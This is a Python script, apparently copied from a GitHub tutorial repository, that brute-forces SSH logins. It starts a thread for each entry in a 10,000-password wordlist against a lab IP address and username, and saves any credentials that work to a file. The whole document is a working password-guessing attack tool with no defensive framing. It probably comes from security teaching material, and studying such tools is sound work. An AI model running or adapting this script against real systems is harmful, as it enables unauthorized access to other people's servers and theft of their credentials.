

## COPIE COLLE DE https://github.com/davidbombal/ssh_bruteforcing/blob/main/main.py
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception


# This function is responsible for the ssh client connecting.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # We attempt to connect to the host, on port 22 which is ssh, with password, and username that was read from the csv file.
        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
        # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
        with open("credentials_found.txt", "a") as fh:
            # We write the credentials that worked to a file.
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")
          
        

# The program will start in the main function.
def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # To keep to functional programming standards we declare ssh_port inside a function.
    list_file="10k-most-common.txt"
    host = "192.168.56.101"
    # This function reads a csv file with passwords.
    with open(list_file) as fh:
        for line in fh:
            #  We create a thread on the ssh_connect function, and send the correct arguments to it.
            t = threading.Thread(target=ssh_connect, args=(host, "mininet", line,))
            # We start the thread.
            t.start()
            # We leave a small time between starting a new connection thread.
            time.sleep(0.2)
            # ssh_connect(host, ssh_port, row[0], row[1])

            

#  We run the main function where execution starts.
__main__()